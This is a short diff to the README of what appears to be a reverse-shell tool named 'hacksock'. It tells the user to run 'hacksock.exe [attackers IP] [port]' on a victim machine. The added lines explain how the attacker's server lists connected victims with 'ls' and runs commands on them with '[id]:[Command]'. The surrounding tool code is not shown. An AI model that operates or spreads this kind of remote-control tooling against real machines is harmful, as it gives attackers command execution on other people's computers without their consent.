@@ -19,10 +19,14 @@ On the victim machine, either alter the source so no arguments are required or r
 
 `hacksock.exe [attackers IP] [port]`
 
+Use `ls` to see all websocket connections.
+
+use `[id]:[Command]` to run commands i.e. if only one connection then `1:dir` will run dir on the first connection listed in `ls`.
+
 # Bugs:
 
 - Code was written in a field therefore full of bugs
-- The server accepts multiple connections however there is no way to switch at present. Functionality coming soon.
+- The server accepts multiple connections however functionality is hit and miss :P
 - Feel free to use and improve. #fixmycode
 
 # Branches:
